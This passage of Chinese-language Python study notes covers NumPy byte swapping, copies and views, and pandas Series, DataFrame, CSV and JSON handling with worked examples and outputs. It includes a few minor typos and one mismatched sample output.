![image-20240420202119353](Python超详细的学习笔记（3.0）.assets/image-20240420202119353.png)

### 1-18-1 numpy.ndarray.byteswap()

numpy.ndarray.byteswap() 函数将 ndarray 中每个元素中的字节进行大小端转换。

```python
import numpy as np 
 
a = np.array([1,  256,  8755], dtype = np.int16)  
print ('我们的数组是：')
print (a)
print ('以十六进制表示内存中的数据：')
print (map(hex,a))
# byteswap() 函数通过传入 true 来原地交换 
print ('调用 byteswap() 函数：')
print (a.byteswap(True))
print ('十六进制形式：')
print (map(hex,a))
# 我们可以看到字节已经交换了
```

输出结果为：

```
我们的数组是：
[   1  256 8755]
以十六进制表示内存中的数据：
<map object at 0x104acb400>
调用 byteswap() 函数：
[  256     1 13090]
十六进制形式：
<map object at 0x104acb3c8>
```

## 1-19 NumPy 副本和视图

副本是一个数据的完整的拷贝，如果我们对副本进行修改，它不会影响到原始数据，物理内存不在同一位置。

视图是数据的一个别称或引用，通过该别称或引用亦便可访问、操作原有数据，但原有数据不会产生拷贝。如果我们对视图进行修改，它会影响到原始数据，物理内存在同一位置。

**视图一般发生在：**

- 1、numpy 的切片操作返回原数据的视图。
- 2、调用 ndarray 的 view() 函数产生一个视图。

**副本一般发生在：**

- Python 序列的切片操作，调用deepCopy()函数。
- 调用 ndarray 的 copy() 函数产生一个副本。

### 1-19-1 无复制

简单的赋值不会创建数组对象的副本。 相反，它使用原始数组的相同id()来访问它。 id()返回 Python 对象的通用标识符，类似于 C 中的指针。

此外，一个数组的任何变化都反映在另一个数组上。 例如，一个数组的形状改变也会改变另一个数组的形状。

```python
import numpy as np 
 
a = np.arange(6)  
print ('我们的数组是：')
print (a)
print ('调用 id() 函数：')
print (id(a))
print ('a 赋值给 b：')
b = a 
print (b)
print ('b 拥有相同 id()：')
print (id(b))
print ('修改 b 的形状：')
b.shape =  3,2  
print (b)
print ('a 的形状也修改了：')
print (a)
```

输出结果为：

```
我们的数组是：
[0 1 2 3 4 5]
调用 id() 函数：
4349302224
a 赋值给 b：
[0 1 2 3 4 5]
b 拥有相同 id()：
4349302224
修改 b 的形状：
[[0 1]
 [2 3]
 [4 5]]
a 的形状也修改了：
[[0 1]
 [2 3]
 [4 5]]
```

### 1-19-2 视图或浅拷贝

ndarray.view() 方会创建一个新的数组对象，该方法创建的新数组的维数变化不会改变原始数据的维数。

```python
import numpy as np 
 
# 最开始 a 是个 3X2 的数组
a = np.arange(6).reshape(3,2)  
print ('数组 a：')
print (a)
print ('创建 a 的视图：')
b = a.view()  
print (b)
print ('两个数组的 id() 不同：')
print ('a 的 id()：')
print (id(a))
print ('b 的 id()：' )
print (id(b))
# 修改 b 的形状，并不会修改 a
b.shape =  2,3
print ('b 的形状：')
print (b)
print ('a 的形状：')
print (a)
```

输出结果为：

```
数组 a：
[[0 1]
 [2 3]
 [4 5]]
创建 a 的视图：
[[0 1]
 [2 3]
 [4 5]]
两个数组的 id() 不同：
a 的 id()：
4314786992
b 的 id()：
4315171296
b 的形状：
[[0 1 2]
 [3 4 5]]
a 的形状：
[[0 1]
 [2 3]
 [4 5]]
```

使用切片创建视图修改数据会影响到原始数组：

```python
import numpy as np 
 
arr = np.arange(12)
print ('我们的数组：')
print (arr)
print ('创建切片：')
a=arr[3:]
b=arr[3:]
a[1]=123
b[2]=234
print(arr)
print(id(a),id(b),id(arr[3:]))
```

输出结果为：

```
我们的数组：
[ 0  1  2  3  4  5  6  7  8  9 10 11]
创建切片：
[  0   1   2   3 123 234   6   7   8   9  10  11]
4545878416 4545878496 4545878576
```

变量 a,b 都是 arr 的一部分视图，对视图的修改会直接反映到原数据中。但是我们观察 a,b 的 id，他们是不同的，也就是说，视图虽然指向原数据，但是他们和赋值引用还是有区别的。

### 1-19-3 副本或深拷贝

ndarray.copy() 函数创建一个副本。 对副本数据进行修改，不会影响到原始数据，它们物理内存不在同一位置。

```python
import numpy as np 
 
a = np.array([[10,10],  [2,3],  [4,5]])  
print ('数组 a：')
print (a)
print ('创建 a 的深层副本：')
b = a.copy()  
print ('数组 b：')
print (b)
# b 与 a 不共享任何内容  
print ('我们能够写入 b 来写入 a 吗？')
print (b is a)
print ('修改 b 的内容：')
b[0,0]  =  100  
print ('修改后的数组 b：')
print (b)
print ('a 保持不变：')
print (a)
```

输出结果为：

```
数组 a：
[[10 10]
 [ 2  3]
 [ 4  5]]
创建 a 的深层副本：
数组 b：
[[10 10]
 [ 2  3]
 [ 4  5]]
我们能够写入 b 来写入 a 吗？
False
修改 b 的内容：
修改后的数组 b：
[[100  10]
 [  2   3]
 [  4   5]]
a 保持不变：
[[10 10]
 [ 2  3]
 [ 4  5]]
```

# 二十，pandas教程

## 1-1 pandas 安装

### 1-1-1 使用 pip 安装 pandas:

```python
pip install pandas
```

安装成功后，我们就可以导入 pandas 包使用：

```Python
import pandas
```

### 1-1-2 查看 pandas 版本

```python
>>> import pandas
>>> pandas.__version__  # 查看版本
'1.1.5'
```

导入 pandas 一般使用别名 **pd** 来代替：

```python
>>> import pandas as pd
>>> pd.__version__  # 查看版本
'1.1.5'
```

### 1-1-3 一个简单的 pandas 实例：

```python
import pandas as pd

mydataset = {
  'sites': ["Google", "Runoob", "Wiki"],
  'number': [1, 2, 3]
}

myvar = pd.DataFrame(mydataset)

print(myvar)
```

执行以上代码，输出结果为：

![image-20240420144421838](Python超详细的学习笔记（3.0）.assets/image-20240420144421838.png)

## 1-2 Pandas 数据结构 - Series

Pandas Series 类似表格中的一个列（column），类似于一维数组，可以保存任何数据类型。

Series 特点：

- **索引：** 每个 `Series` 都有一个索引，它可以是整数、字符串、日期等类型。如果没有显式指定索引，Pandas 会自动创建一个默认的整数索引。

- **数据类型：** `Series` 可以容纳不同数据类型的元素，包括整数、浮点数、字符串等。

- Series 是 Pandas 中的一种基本数据结构，类似于一维数组或列表，但具有标签（索引），使得数据在处理和分析时更具灵活性。

  以下是关于 Pandas 中的 Series 的详细介绍： 创建 Series： 可以使用 pd.Series() 构造函数创建一个 Series 对象，传递一个数据数组（可以是列表、NumPy 数组等）和一个可选的索引数组。

```Python
pandas.Series( data, index, dtype, name, copy)
```

参数说明：

- **data**：一组数据(ndarray 类型)。
- **index**：数据索引标签，如果不指定，默认从 0 开始。
- **dtype**：数据类型，默认会自己判断。
- **name**：设置名称。
- **copy**：拷贝数据，默认为 False。

创建一个简单的 Series 实例：

### 1-2-1 **实例**

```Python
import pandas as pd

a = [1, 2, 3]

myvar = pd.Series(a)

print(myvar)
```

![image-20240420144621687](Python超详细的学习笔记（3.0）.assets/image-20240420144621687.png)

### 1-2-2 **实例**

```python
import pandas as pd

a = [1, 2, 3]

myvar = pd.Series(a)

print(myvar[1])
```

输出结果如下：

```
2
```

我们可以指定索引值，如下实例：

### 1-2-3 实例

```python
import pandas as pd

a = ["Google", "Runoob", "Wiki"]

myvar = pd.Series(a, index = ["x", "y", "z"])

print(myvar)
```

输出结果如下：

```python
Runoob
```

我们也可以使用 key/value 对象，类似字典来创建 Series：

### 1-2-4 实例

```python
import pandas as pd

sites = {1: "Google", 2: "Runoob", 3: "Wiki"}

myvar = pd.Series(sites)

print(myvar)
```

![image-20240420144917331](Python超详细的学习笔记（3.0）.assets/image-20240420144917331.png)

### 1-2-5 实例

```Python
import pandas as pd

sites = {1: "Google", 2: "Runoob", 3: "Wiki"}

myvar = pd.Series(sites, index = [1, 2])

print(myvar)
```

![image-20240420144955995](Python超详细的学习笔记（3.0）.assets/image-20240420144955995.png)

设置 Series 名称参数：

### 1-2-6 实例

```python
import pandas as pd

sites = {1: "Google", 2: "Runoob", 3: "Wiki"}

myvar = pd.Series(sites, index = [1, 2], name="RUNOOB-Series-TEST" )

print(myvar)
```

![image-20240420145105226](Python超详细的学习笔记（3.0）.assets/image-20240420145105226.png)

### 1-2-7 更多 Series 说明

#### 7-1 **基本操作：**

```python
# 获取值
value = series[2]  # 获取索引为2的值

# 获取多个值
subset = series[1:4]  # 获取索引为1到3的值

# 使用自定义索引
value = series_with_index['b']  # 获取索引为'b'的值

# 索引和值的对应关系
for index, value in series_with_index.items():
    print(f"Index: {index}, Value: {value}")
```

#### 7-2 **基本运算：**

```python
# 算术运算
result = series * 2  # 所有元素乘以2

# 过滤
filtered_series = series[series > 2]  # 选择大于2的元素

# 数学函数
import numpy as np
result = np.sqrt(series)  # 对每个元素取平方根
```

#### 7-3 **属性和方法：**

```python
# 获取索引
index = series_with_index.index

# 获取值数组
values = series_with_index.values

# 获取描述统计信息
stats = series_with_index.describe()

# 获取最大值和最小值的索引
max_index = series_with_index.idxmax()
min_index = series_with_index.idxmin()
```

#### 7-4 **注意事项：**

- `Series` 中的数据是有序的。
- 可以将 `Series` 视为带有索引的一维数组。
- 索引可以是唯一的，但不是必须的。
- 数据可以是标量、列表、NumPy 数组等。

## 1-3 Pandas 数据结构 - DataFrame

DataFrame 是一个表格型的数据结构，它含有一组有序的列，每列可以是不同的值类型（数值、字符串、布尔型值）。DataFrame 既有行索引也有列索引，它可以被看做由 Series 组成的字典（共同用一个索引）。

**DataFrame 特点：**

- **列和行：** `DataFrame` 由多个列组成，每一列都有一个名称，可以看作是一个 `Series`。同时，`DataFrame` 有一个行索引，用于标识每一行。
- **二维结构：** `DataFrame` 是一个二维表格，具有行和列。可以将其视为多个 `Series` 对象组成的字典。
- **列的数据类型：** 不同的列可以包含不同的数据类型，例如整数、浮点数、字符串等。

![image-20240420145333354](Python超详细的学习笔记（3.0）.assets/image-20240420145333354.png)

![image-20240420145343579](Python超详细的学习笔记（3.0）.assets/image-20240420145343579.png)

DataFrame 构造方法如下：

```
pandas.DataFrame( data, index, columns, dtype, copy)
```

参数说明：

- **data**：一组数据(ndarray、series, map, lists, dict 等类型)。
- **index**：索引值，或者可以称为行标签。
- **columns**：列标签，默认为 RangeIndex (0, 1, 2, …, n) 。
- **dtype**：数据类型。
- **copy**：拷贝数据，默认为 False。

Pandas DataFrame 是一个二维的数组结构，类似二维数组。

### 1-3-1 实例 - 使用列表创建

```python
import pandas as pd

data = [['Google', 10], ['Runoob', 12], ['Wiki', 13]]

# 创建DataFrame
df = pd.DataFrame(data, columns=['Site', 'Age'])

# 使用astype方法设置每列的数据类型
df['Site'] = df['Site'].astype(str)
df['Age'] = df['Age'].astype(float)

print(df)
```

也可以使用字典来创建：

### 1-3-2 实例 - 使用字典创建

```python
import pandas as pd

data = {'Site':['Google', 'Runoob', 'Wiki'], 'Age':[10, 12, 13]}

df = pd.DataFrame(data)

print (df)
```

![image-20240420145500376](Python超详细的学习笔记（3.0）.assets/image-20240420145500376.png)

以下实例使用 ndarrays 创建，ndarray 的长度必须相同， 如果传递了 index，则索引的长度应等于数组的长度。如果没有传递索引，则默认情况下，索引将是range(n)，其中n是数组长度。

ndarrays 可以参考：[NumPy Ndarray 对象](https://www.runoob.com/numpy/numpy-ndarray-object.html)

### 1-3-3 实例 - 使用 ndarrays 创建

```python
import numpy as np
import pandas as pd

# 创建一个包含网站和年龄的二维ndarray
ndarray_data = np.array([
    ['Google', 10],
    ['Runoob', 12],
    ['Wiki', 13]
])

# 使用DataFrame构造函数创建数据帧
df = pd.DataFrame(ndarray_data, columns=['Site', 'Age'])

# 打印数据帧
print(df)
```

![image-20240420145614856](Python超详细的学习笔记（3.0）.assets/image-20240420145614856.png)

从以上输出结果可以知道， DataFrame 数据类型一个表格，包含 rows（行） 和 columns（列）：

![image-20240420145634006](Python超详细的学习笔记（3.0）.assets/image-20240420145634006.png)

还可以使用字典（key/value），其中字典的 key 为列名:

### 1-3-4 实例 - 使用字典创建

```python
import pandas as pd

data = [{'a': 1, 'b': 2},{'a': 5, 'b': 10, 'c': 20}]

df = pd.DataFrame(data)

print (df)
```

输出结果为：

```python
   a   b     c
0  1   2   NaN
1  5  10  20.0
```

没有对应的部分数据为 **NaN**。

Pandas 可以使用 **loc** 属性返回指定行的数据，如果没有设置索引，第一行索引为 **0**，第二行索引为 **1**，以此类推：

### 1-3-5 实例

```python
import pandas as pd

data = {
  "calories": [420, 380, 390],
  "duration": [50, 40, 45]
}

# 数据载入到 DataFrame 对象
df = pd.DataFrame(data)

# 返回第一行
print(df.loc[0])
# 返回第二行
print(df.loc[1])
```

输出结果如下：

```python
calories    420
duration     50
Name: 0, dtype: int64
calories    380
duration     40
Name: 1, dtype: int64
```

**注意：**返回结果其实就是一个 Pandas Series 数据。

也可以返回多行数据，使用 **[[ ... ]]** 格式，**...** 为各行的索引，以逗号隔开：

### 1-3-6 实例

```python
import pandas as pd

data = {
  "calories": [420, 380, 390],
  "duration": [50, 40, 45]
}

# 数据载入到 DataFrame 对象
df = pd.DataFrame(data)

# 返回第一行和第二行
print(df.loc[[0, 1]])
```

输出结果为：

```
   calories  duration
0       420        50
1       380        40
```

**注意：**返回结果其实就是一个 Pandas DataFrame 数据。

我们可以指定索引值，如下实例：

### 1-3-7 实例

```Python
import pandas as pd

data = {
  "calories": [420, 380, 390],
  "duration": [50, 40, 45]
}

df = pd.DataFrame(data, index = ["day1", "day2", "day3"])

print(df)
```

输出结果为：

```
      calories  duration
day1       420        50
day2       380        40
day3       390        45
```

Pandas 可以使用 **loc** 属性返回指定索引对应到某一行：

### 1-3-8 实例

```python
import pandas as pd

data = {
  "calories": [420, 380, 390],
  "duration": [50, 40, 45]
}

df = pd.DataFrame(data, index = ["day1", "day2", "day3"])

# 指定索引
print(df.loc["day2"])
```

输出结果为：

```
calories    380
duration     40
Name: day2, dtype: int64
```

### 1-3-9 更多 DataFrame 说明

#### 9-1 **基本操作：**

```
# 获取列
name_column = df['Name']

# 获取行
first_row = df.loc[0]

# 选择多列
subset = df[['Name', 'Age']]

# 过滤行
filtered_rows = df[df['Age'] > 30]
```

#### 9-2 **属性和方法：**

```
# 获取列名
columns = df.columns

# 获取形状（行数和列数）
shape = df.shape

# 获取索引
index = df.index

# 获取描述统计信息
stats = df.describe()
```

#### 9-3 **数据操作：**

```
# 添加新列
df['Salary'] = [50000, 60000, 70000]

# 删除列
df.drop('City', axis=1, inplace=True)

# 排序
df.sort_values(by='Age', ascending=False, inplace=True)

# 重命名列
df.rename(columns={'Name': 'Full Name'}, inplace=True)
```

#### 9-4 **从外部数据源创建 DataFrame：**

```
# 从CSV文件创建 DataFrame
df_csv = pd.read_csv('example.csv')

# 从Excel文件创建 DataFrame
df_excel = pd.read_excel('example.xlsx')

# 从字典列表创建 DataFrame
data_list = [{'Name': 'Alice', 'Age': 25}, {'Name': 'Bob', 'Age': 30}]
df_from_list = pd.DataFrame(data_list)
```

#### 9-5 **注意事项：**

- `DataFrame` 是一种灵活的数据结构，可以容纳不同数据类型的列。
- 列名和行索引可以是字符串、整数等。
- `DataFrame` 可以通过多种方式进行数据选择、过滤、修改和分析。
- 通过对 `DataFrame` 的操作，可以进行数据清洗、转换、分析和可视化等工作。

## 1-4 Pandas CSV 文件

- CSV（Comma-Separated Values，逗号分隔值，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。
- CSV 是一种通用的、相对简单的文件格式，被用户、商业和科学广泛应用。
- Pandas 可以很方便的处理 CSV 文件，本文以 [nba.csv](https://static.jyshare.com/download/nba.csv) 为例，你可以[下载 nba.csv](https://static.jyshare.com/download/nba.csv) 或[打开 nba.csv](https://static.jyshare.com/download/nba.csv.txt) 查看。

### 1-4-1 实例

```python
import pandas as pd

df = pd.read_csv('nba.csv')

print(df.to_string())
```

**to_string()** 用于返回 DataFrame 类型的数据，如果不使用该函数，则输出结果为数据的前面 5 行和末尾 5 行，中间部分以 **...** 代替。

### 1-4-2 实例

```python
import pandas as pd

df = pd.read_csv('nba.csv')

print(df)
```

输出结果为：

```
              Name            Team  Number Position   Age Height  Weight            College     Salary
0    Avery Bradley  Boston Celtics     0.0       PG  25.0    6-2   180.0              Texas  7730337.0
1      Jae Crowder  Boston Celtics    99.0       SF  25.0    6-6   235.0          Marquette  6796117.0
2     John Holland  Boston Celtics    30.0       SG  27.0    6-5   205.0  Boston University        NaN
3      R.J. Hunter  Boston Celtics    28.0       SG  22.0    6-5   185.0      Georgia State  1148640.0
4    Jonas Jerebko  Boston Celtics     8.0       PF  29.0   6-10   231.0                NaN  5000000.0
..             ...             ...     ...      ...   ...    ...     ...                ...        ...
453   Shelvin Mack       Utah Jazz     8.0       PG  26.0    6-3   203.0             Butler  2433333.0
454      Raul Neto       Utah Jazz    25.0       PG  24.0    6-1   179.0                NaN   900000.0
455   Tibor Pleiss       Utah Jazz    21.0        C  26.0    7-3   256.0                NaN  2900000.0
456    Jeff Withey       Utah Jazz    24.0        C  26.0    7-0   231.0             Kansas   947276.0
457            NaN             NaN     NaN      NaN   NaN    NaN     NaN                NaN        NaN
```

我们也可以使用 **to_csv()** 方法将 DataFrame 存储为 csv 文件：

### 1-4-3 实例

```python
import pandas as pd 
   
# 三个字段 name, site, age
nme = ["Google", "Runoob", "Taobao", "Wiki"]
st = ["www.google.com", "www.runoob.com", "www.taobao.com", "www.wikipedia.org"]
ag = [90, 40, 80, 98]
   
# 字典
dict = {'name': nme, 'site': st, 'age': ag} 
     
df = pd.DataFrame(dict)
  
# 保存 dataframe
df.to_csv('site.csv')
```

执行成功后，我们打开 site.csv 文件，显示结果如下：

![image-20240420150407245](Python超详细的学习笔记（3.0）.assets/image-20240420150407245.png)

### 1-4-4 数据处理

#### 4-1 head()

**head( \*n\* )** 方法用于读取前面的 n 行，如果不填参数 n ，默认返回 5 行。

##### 4-1-1 实例 - 读取前面 5 行

```python
import pandas as pd

df = pd.read_csv('nba.csv')

print(df.head())
```

输出结果为：

```
            Name            Team  Number Position   Age Height  Weight            College     Salary
0  Avery Bradley  Boston Celtics     0.0       PG  25.0    6-2   180.0              Texas  7730337.0
1    Jae Crowder  Boston Celtics    99.0       SF  25.0    6-6   235.0          Marquette  6796117.0
2   John Holland  Boston Celtics    30.0       SG  27.0    6-5   205.0  Boston University        NaN
3    R.J. Hunter  Boston Celtics    28.0       SG  22.0    6-5   185.0      Georgia State  1148640.0
4  Jonas Jerebko  Boston Celtics     8.0       PF  29.0   6-10   231.0                NaN  5000000.0
```

##### 4-1-2 实例 - 读取前面 10 行

```python
import pandas as pd

df = pd.read_csv('nba.csv')

print(df.head(10))
```

输出结果为：

```
            Name            Team  Number Position   Age Height  Weight            College      Salary
0  Avery Bradley  Boston Celtics     0.0       PG  25.0    6-2   180.0              Texas   7730337.0
1    Jae Crowder  Boston Celtics    99.0       SF  25.0    6-6   235.0          Marquette   6796117.0
2   John Holland  Boston Celtics    30.0       SG  27.0    6-5   205.0  Boston University         NaN
3    R.J. Hunter  Boston Celtics    28.0       SG  22.0    6-5   185.0      Georgia State   1148640.0
4  Jonas Jerebko  Boston Celtics     8.0       PF  29.0   6-10   231.0                NaN   5000000.0
5   Amir Johnson  Boston Celtics    90.0       PF  29.0    6-9   240.0                NaN  12000000.0
6  Jordan Mickey  Boston Celtics    55.0       PF  21.0    6-8   235.0                LSU   1170960.0
7   Kelly Olynyk  Boston Celtics    41.0        C  25.0    7-0   238.0            Gonzaga   2165160.0
8   Terry Rozier  Boston Celtics    12.0       PG  22.0    6-2   190.0         Louisville   1824360.0
9   Marcus Smart  Boston Celtics    36.0       PG  22.0    6-4   220.0     Oklahoma State   3431040.0
```

#### 4-2 tail()

**tail( \*n\* )** 方法用于读取尾部的 n 行，如果不填参数 n ，默认返回 5 行，空行各个字段的值返回 **NaN**。

##### 4-2-1 实例 - 读取末尾 5 行

```python
import pandas as pd

df = pd.read_csv('nba.csv')

print(df.tail())
```

输出结果为：

```
             Name       Team  Number Position   Age Height  Weight College     Salary
453  Shelvin Mack  Utah Jazz     8.0       PG  26.0    6-3   203.0  Butler  2433333.0
454     Raul Neto  Utah Jazz    25.0       PG  24.0    6-1   179.0     NaN   900000.0
455  Tibor Pleiss  Utah Jazz    21.0        C  26.0    7-3   256.0     NaN  2900000.0
456   Jeff Withey  Utah Jazz    24.0        C  26.0    7-0   231.0  Kansas   947276.0
457           NaN        NaN     NaN      NaN   NaN    NaN     NaN     NaN        NaN
```

##### 4-2-2 实例 - 读取末尾 10 行

```python
import pandas as pd

df = pd.read_csv('nba.csv')

print(df.tail(10))
```

输出结果为：

```
               Name       Team  Number Position   Age Height  Weight   College      Salary
448  Gordon Hayward  Utah Jazz    20.0       SF  26.0    6-8   226.0    Butler  15409570.0
449     Rodney Hood  Utah Jazz     5.0       SG  23.0    6-8   206.0      Duke   1348440.0
450      Joe Ingles  Utah Jazz     2.0       SF  28.0    6-8   226.0       NaN   2050000.0
451   Chris Johnson  Utah Jazz    23.0       SF  26.0    6-6   206.0    Dayton    981348.0
452      Trey Lyles  Utah Jazz    41.0       PF  20.0   6-10   234.0  Kentucky   2239800.0
453    Shelvin Mack  Utah Jazz     8.0       PG  26.0    6-3   203.0    Butler   2433333.0
454       Raul Neto  Utah Jazz    25.0       PG  24.0    6-1   179.0       NaN    900000.0
455    Tibor Pleiss  Utah Jazz    21.0        C  26.0    7-3   256.0       NaN   2900000.0
456     Jeff Withey  Utah Jazz    24.0        C  26.0    7-0   231.0    Kansas    947276.0
457             NaN        NaN     NaN      NaN   NaN    NaN     NaN       NaN         NaN
```

#### 4-3 info()

info() 方法返回表格的一些基本信息：

##### 4-3-1 实例

```python
import pandas as pd

df = pd.read_csv('nba.csv')

print(df.info())
```

输出结果为：

```
<class 'pandas.core.frame.DataFrame'>
RangeIndex: 458 entries, 0 to 457          # 行数，458 行，第一行编号为 0
Data columns (total 9 columns):            # 列数，9列
 #   Column    Non-Null Count  Dtype       # 各列的数据类型
---  ------    --------------  -----  
 0   Name      457 non-null    object 
 1   Team      457 non-null    object 
 2   Number    457 non-null    float64
 3   Position  457 non-null    object 
 4   Age       457 non-null    float64
 5   Height    457 non-null    object 
 6   Weight    457 non-null    float64
 7   College   373 non-null    object         # non-null，意思为非空的数据    
 8   Salary    446 non-null    float64
dtypes: float64(4), object(5)                 # 类型
```

non-null 为非空数据，我们可以看到上面的信息中，总共 458 行，College 字段的空值最多。

## 1-5 Pandas JSON

- JSON（**J**ava**S**cript **O**bject **N**otation，JavaScript 对象表示法），是存储和交换文本信息的语法，类似 XML。
- JSON 比 XML 更小、更快，更易解析，更多 JSON 内容可以参考 [JSON 教程](https://www.runoob.com/json/json-tutorial.html)。

Pandas 可以很方便的处理 JSON 数据，本文以 [sites.json](https://static.jyshare.com/download/sites.json) 为例，内容如下：

```json
[
   {
   "id": "A001",
   "name": "菜鸟教程",
   "url": "www.runoob.com",
   "likes": 61
   },
   {
   "id": "A002",
   "name": "Google",
   "url": "www.google.com",
   "likes": 124
   },
   {
   "id": "A003",
   "name": "淘宝",
   "url": "www.taobao.com",
   "likes": 45
   }
]
```

### 1-5-1 实例

```python
import pandas as pd

df = pd.read_json('sites.json')
   
print(df.to_string())
```

**to_string()** 用于返回 DataFrame 类型的数据，我们也可以直接处理 JSON 字符串。

### 1-5-2 实例

```Python
import pandas as pd

data =[
    {
      "id": "A001",
      "name": "菜鸟教程",
      "url": "www.runoob.com",
      "likes": 61
    },
    {
      "id": "A002",
      "name": "Google",
      "url": "www.google.com",
      "likes": 124
    },
    {
      "id": "A003",
      "name": "淘宝",
      "url": "www.taobao.com",
      "likes": 45
    }
]
df = pd.DataFrame(data)

print(df)
```

以上实例输出结果为：

```
     id    name             url  likes
0  A001    菜鸟教程  www.runoob.com     61
1  A002  Google  www.google.com    124
2  A003      淘宝  www.taobao.com     45
```

JSON 对象与 Python 字典具有相同的格式，所以我们可以直接将 Python 字典转化为 DataFrame 数据：

### 1-5-3 实例

```Python
import pandas as pd


# 字典格式的 JSON                                                                                              
s = {
    "col1":{"row1":1,"row2":2,"row3":3},
    "col2":{"row1":"x","row2":"y","row3":"z"}
}

# 读取 JSON 转为 DataFrame                                                                                           
df = pd.DataFrame(s)
print(df)
```

以上实例输出结果为：

```
      col1 col2
row1     1    x
row2     2    y
row3     3    z
```

从 URL 中读取 JSON 数据：

### 1-5-4 实例

```python
import pandas as pd

URL = 'https://static.jyshare.com/download/sites.json'
df = pd.read_json(URL)
print(df)
```

以上实例输出结果为：

```
     id    name             url  likes
0  A001    菜鸟教程  www.runoob.com     61
1  A002  Google  www.google.com    124
2  A003      淘宝  www.taobao.com     45
```

### 1-5-5 内嵌的 JSON 数据

假设有一组内嵌的 JSON 数据文件 **nested_list.json** ：

nested_list.json 文件内容

```python
{
    "school_name": "ABC primary school",
    "class": "Year 1",
    "students": [
    {
        "id": "A001",
        "name": "Tom",
        "math": 60,
        "physics": 66,
        "chemistry": 61
    },
    {
        "id": "A002",
        "name": "James",
        "math": 89,
        "physics": 76,
        "chemistry": 51
    },
    {
        "id": "A003",
        "name": "Jenny",
        "math": 79,
        "physics": 90,
        "chemistry": 78
    }]
}
```

使用以下代码格式化完整内容：

#### 5-1 实例

```python
import pandas as pd

df = pd.read_json('nested_list.json')

print(df)
```

以上实例输出结果为：

```
          school_name   class                                           students
0  ABC primary school  Year 1  {'id': 'A001', 'name': 'Tom', 'math': 60, 'phy...
1  ABC primary school  Year 1  {'id': 'A002', 'name': 'James', 'math': 89, 'p...
2  ABC primary school  Year 1  {'id': 'A003', 'name': 'Jenny', 'math': 79, 'p...
```

这时我们就需要使用到 **json_normalize()** 方法将内嵌的数据完整的解析出来：

#### 5-2 实例

```python
import pandas as pd
import json

# 使用 Python JSON 模块载入数据
with open('nested_list.json','r') as f:
    data = json.loads(f.read())

# 展平数据
df_nested_list = pd.json_normalize(data, record_path =['students'])
print(df_nested_list)
```

以上实例输出结果为：

```
     id   name  math  physics  chemistry
0  A001    Tom    60       66         61
1  A002  James    89       76         51
2  A003  Jenny    79       90         78
```

- **data = json.loads(f.read())** 使用 Python JSON 模块载入数据。
- **json_normalize()** 使用了参数 **record_path** 并设置为 **['students']** 用于展开内嵌的 JSON 数据 **students**。

显示结果还没有包含 school_name 和 class 元素，如果需要展示出来可以使用 meta 参数来显示这些元数据：

#### 5-3  实例

```python
import pandas as pd
import json

# 使用 Python JSON 模块载入数据
with open('nested_list.json','r') as f:
    data = json.loads(f.read())

# 展平数据
df_nested_list = pd.json_normalize(
    data, 
    record_path =['students'], 
    meta=['school_name', 'class']
)
print(df_nested_list)
```

以上实例输出结果为：

```
     id   name  math  physics  chemistry         school_name   class
0  A001    Tom    60       66         61  ABC primary school  Year 1
1  A002  James    89       76         51  ABC primary school  Year 1
2  A003  Jenny    79       90         78  ABC primary school  Year 1
```

接下来，让我们尝试读取更复杂的 JSON 数据，该数据嵌套了列表和字典，数据文件 **nested_mix.json** 如下：

**nested_mix.json 文件内容**

```python
{
    "school_name": "local primary school",
    "class": "Year 1",
    "info": {
      "president": "John Kasich",
      "address": "ABC road, London, UK",
      "contacts": {
        "email": "admin@e.com",
        "tel": "123456789"
      }
    },
    "students": [
    {
        "id": "A001",
        "name": "Tom",
        "math": 60,
        "physics": 66,
        "chemistry": 61
    },
    {
        "id": "A002",
        "name": "James",
        "math": 89,
        "physics": 76,
        "chemistry": 51
    },
    {
        "id": "A003",
        "name": "Jenny",
        "math": 79,
        "physics": 90,
        "chemistry": 78
    }]
}
```

nested_mix.json 文件转换为 DataFrame：

```python
mport pandas as pd
import json

# 使用 Python JSON 模块载入数据
with open('nested_mix.json','r') as f:
    data = json.loads(f.read())
   
df = pd.json_normalize(
    data,
    record_path =['students'],
    meta=[
        'class',
        ['info', 'president'],
        ['info', 'contacts', 'tel']
    ]
)

print(df)
```

以上实例输出结果为：

```
     id   name  math  physics  chemistry   class info.president info.contacts.tel
0  A001    Tom    60       66         61  Year 1    John Kasich         123456789
1  A002  James    89       76         51  Year 1    John Kasich         123456789
2  A003  Jenny    79       90         78  Year 1    John Kasich         123456789
```

读取内嵌数据中的一组数据

以下是实例文件 **nested_deep.json**，我们只读取内嵌中的 **math** 字段：

**nested_deep.json 文件内容**

```python
{
    "school_name": "local primary school",
    "class": "Year 1",
    "students": [
    {
        "id": "A001",
        "name": "Tom",
        "grade": {
            "math": 60,
            "physics": 66,
            "chemistry": 61
        }
  
    },
    {
        "id": "A002",
        "name": "James",
        "grade": {
            "math": 89,
            "physics": 76,
            "chemistry": 51
        }
        
    },
    {
        "id": "A003",
        "name": "Jenny",
        "grade": {
            "math": 79,
            "physics": 90,
            "chemistry": 78
        }
    }]
}
```

这里我们需要使用到 **glom** 模块来处理数据套嵌，**glom** 模块允许我们使用 **.** 来访问内嵌对象的属性。

第一次使用我们需要安装 glom：

```
pip3 install glom
```

#### 5-4 实例

```python
import pandas as pd
from glom import glom

df = pd.read_json('nested_deep.json')

data = df['students'].apply(lambda row: glom(row, 'grade.math'))
print(data)
```

以上实例输出结果为：

```
0    60
1    89
2    79
Name: students, dtype: int64
```

## 1-6 Pandas 数据清洗

数据清洗是对一些没有用的数据进行处理的过程。

很多数据集存在数据缺失、数据格式错误、错误数据或重复数据的情况，如果要使数据分析更加准确，就需要对这些没有用的数据进行处理。

在这个教程中，我们将利用 Pandas包来进行数据清洗。

本文使用到的测试数据 [property-data.csv](https://static.jyshare.com/download/property-data.csv) 如下：

![image-20240420152606258](Python超详细的学习笔记（3.0）.assets/image-20240420152606258.png)

上表包含了四种空数据：

- n/a
- NA
- —
- na

## 1-7 Pandas 清洗空值

如果我们要删除包含空字段的行，可以使用 **dropna()** 方法，语法格式如下：

```
DataFrame.dropna(axis=0, how='any', thresh=None, subset=None, inplace=False)
```

**参数说明：**

- axis：默认为 **0**，表示逢空值剔除整行，如果设置参数 **axis＝1** 表示逢空值去掉整列。
- how：默认为 **'any'** 如果一行（或一列）里任何一个数据有出现 NA 就去掉整行，如果设置 **how='all'** 一行（或列）都是 NA 才去掉这整行。
- thresh：设置需要多少非空值的数据才可以保留下来的。
- subset：设置想要检查的列。如果是多个列，可以使用列名的 list 作为参数。
